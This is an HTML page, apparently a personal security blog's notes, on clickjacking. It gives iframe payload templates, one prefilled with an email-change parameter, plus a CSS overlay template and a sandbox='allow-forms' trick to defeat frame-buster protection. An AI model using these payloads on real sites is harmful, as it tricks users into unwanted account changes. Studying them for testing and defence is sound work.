@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mi Blog</title>
+  <link rel="stylesheet" href="file:///Users/b0ydc/Documents/CYBER/SITE/css/styles.css">
+</head>
+<body>
+  <header>
+    <h4 align="right">@b0ydC</h4>
+  </header>
+
+  <main>
+    <article>
+     
+<h2>1. GENERAL INFORMATION</h2> 
+
+NOTES:<br><br>
+- The goal is to trick the user to make them to click on things that are not 100% real, i mean, it is some kind of decoy to make the 
+user to do what you want.<br>
+- Normally it is used with the iframe tag.<br>
+- Check the code, URL attempts can be completed.<br>
+- Validate the CSRF token.<br><br>
+
+SAMPLE IFRAMES<br><br>
+
+<u>GENERAL IFRAME TEST</u> <br><br>
+
+&lt;iframe src="URL_TO_CLICKJACK">&lt;&sol;iframe><br><br>
+
+You can add any URL that you can attack as source reference.<br><br>
+
+<u>URL PARAMETERS</u><br><br>
+
+&lt;iframe src="URL_TO_CLICKJACK/my-account?email=email@machete.com">&lt;&sol;iframe><br><br>
+
+In here the parameter that we are using to attack is email, so, the parameter is defined. Inspection of the requests are needed.<br><br>
+
+<u>TEMPLATE STYLE</u><br><br>
+
+&lt;style&gt;<br>
+    iframe {<br>
+        position:relative;<br>
+        width:_value;<br>
+        height: _value;<br>
+        opacity: _opacity;<br>
+        z-index: 2;<br>
+    }<br>
+    div {<br>
+        position:absolute;<br>
+        top:_value;<br>
+        left:_value;<br>
+        z-index: 1;<br>
+    }<br>
+&lt;&sol;style&gt;
+
+<h2>2. BYPASS PROTECTION</h2> 
+
+
+<u>FRAME BUSTER</u><br><br>
+
+Normally, the attribute sandbox="allow-forms" neutralize the frame buster. So a simple iframe tag can help to confirm if
+it is allowed or not. If the URL is reflected, it means it is not blocked. <br><br>
+
+SAMPLE:<br><br>
+
+&lt;iframe sandbox="allow-forms" src="URL_TO_CLICKJACK/my-account?email=email@machete.com"&gt;&lt;&sol;iframe>
+
+    </article>
+  </main>
+</body>
+</html>
